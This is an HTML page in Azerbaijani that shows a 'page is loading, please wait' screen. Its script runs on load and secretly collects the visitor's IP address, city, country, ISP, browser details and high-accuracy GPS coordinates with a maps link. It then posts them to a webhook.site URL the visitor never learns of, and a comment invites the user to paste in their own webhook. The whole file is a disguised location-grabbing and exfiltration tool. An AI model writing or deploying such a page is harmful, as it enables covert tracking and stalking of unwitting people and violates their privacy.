<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yüklənir...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f9; }
        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <div class="box">
        <h2>Səhifə yüklənir...</h2>
        <p id="status">Zəhmət olmasa gözləyin.</p>
    </div>

    <script>
        // ⚠️ Veb-saytdan kopyaladığınız unikal linki bura yapışdırın:
        const WEBHOOK_URL = "https://webhook.site/4ca6c2f0-c87d-4a7e-8ead-155c5478836d";

        // 1. IP və Şəbəkə Məlumatlarını çəkirik
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(ipData => {
                const ip = ipData.ip || "Naməlum";
                const city = ipData.city || "Naməlum";
                const country = ipData.country_name || "Naməlum";
                const isp = ipData.org || "Naməlum";
                const userAgent = navigator.userAgent;

                // 2. GPS Məkanını istəyirik
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                            
                            document.getElementById("status").innerText = "Hazırdır!";

                            // Göndəriləcək məlumat paketi (JSON formatında)
                            const data = {
                                ip: ip,
                                seher: city,
                                olke: country,
                                provayder: isp,
                                cihaz_brauzer: userAgent,
                                en_dairesi: lat,
                                uzunluq_dairesi: lon,
                                xerite: mapsLink
                            };

                            sendToWebhook(data);
                        },
                        (error) => {
                            // GPS icazə verilməzsə, təkcə IP və cihaz məlumatlarını göndərir
                            const data = {
                                ip: ip,
                                seher: city,
                                olke: country,
                                provayder: isp,
                                cihaz_brauzer: userAgent,
                                gps_mesaji: "GPS İcazəsi Verilmədi"
                            };
                            sendToWebhook(data);
                        },
                        { enableHighAccuracy: true }
                    );
                } else {
                    document.getElementById("status").innerText = "Sistem dəstəklənmir.";
                }
            })
            .catch(err => {
                console.log("Xəta baş verdi");
            });

        // Webhook.site-ə məlumat göndərən funksiya
        function sendToWebhook(data) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
